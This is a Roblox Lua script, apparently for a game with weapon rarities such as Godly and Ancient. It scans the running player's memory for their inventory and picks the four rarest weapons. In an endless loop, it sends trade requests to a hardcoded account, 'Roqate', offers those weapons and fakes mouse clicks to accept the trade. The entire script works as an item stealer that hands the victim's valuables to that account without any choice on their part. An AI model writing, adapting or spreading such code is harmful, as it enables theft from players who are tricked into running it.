local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 2
local ITEM_ADD_DELAY = 0.4
local ACCEPT_WAIT_TIMEOUT = 20

local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

local function getTop4Weapons()
    local inv = getCorrectMyInventory()
    if not inv then return {} end

    local candidates = {}
    for _, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(candidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    table.sort(candidates, function(a,b) return a.priority < b.priority end)
    local picked = {}
    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, candidates[i].name)
    end
    return picked
end

local function waitForTradeGUI()
    local gui
    local startTime = os.clock()
    repeat
        gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        task.wait(0.2)
    until gui or os.clock() - startTime > 10
    return gui
end

local function findAcceptButton(gui)
    for _, btn in ipairs(gui:GetDescendants()) do
        if btn:IsA("TextButton") and string.find(string.lower(btn.Text), "accept") then
            return btn
        end
    end
    return nil
end

local function waitForOtherAccept(gui)
    local startTime = os.clock()
    while os.clock() - startTime < ACCEPT_WAIT_TIMEOUT do
        for _, label in ipairs(gui:GetDescendants()) do
            if label:IsA("TextLabel") and string.find(string.lower(label.Text), "other player has accepted") then
                return true
            end
        end
        task.wait(0.3)
    end
    return false
end

local function addAllItems(weapons)
    for _, weapon in ipairs(weapons) do
        TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end
end

local function doTradeCycle(targetPlayer)
    print("Starting trade with", targetPlayer.Name)
    local weapons = getTop4Weapons()
    if #weapons == 0 then return end

    pcall(function() TradeRemotes.SendRequest:InvokeServer(targetPlayer) end)
    local gui = waitForTradeGUI()
    if not gui then return end

    addAllItems(weapons)
    task.wait(0.5)

    local acceptBtn = findAcceptButton(gui)
    if not acceptBtn then
        warn("Accept button not found!")
        return
    end

    -- Click Accept once after adding
    print("Clicking Accept")
    game:GetService("VirtualInputManager"):SendMouseButtonEvent(acceptBtn.AbsolutePosition.X + 5, acceptBtn.AbsolutePosition.Y + 5, 0, true, nil, 0)
    task.wait(0.1)
    game:GetService("VirtualInputManager"):SendMouseButtonEvent(acceptBtn.AbsolutePosition.X + 5, acceptBtn.AbsolutePosition.Y + 5, 0, false, nil, 0)

    print("Waiting for other player to accept...")
    if waitForOtherAccept(gui) then
        print("Other accepted → double-clicking Accept")
        for i=1,2 do
            game:GetService("VirtualInputManager"):SendMouseButtonEvent(acceptBtn.AbsolutePosition.X + 5, acceptBtn.AbsolutePosition.Y + 5, 0, true, nil, 0)
            task.wait(0.05)
            game:GetService("VirtualInputManager"):SendMouseButtonEvent(acceptBtn.AbsolutePosition.X + 5, acceptBtn.AbsolutePosition.Y + 5, 0, false, nil, 0)
            task.wait(0.1)
        end
    else
        warn("Timeout waiting for other player.")
    end

    task.wait(2)
end

while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    end
    task.wait(TRADE_COOLDOWN)
end
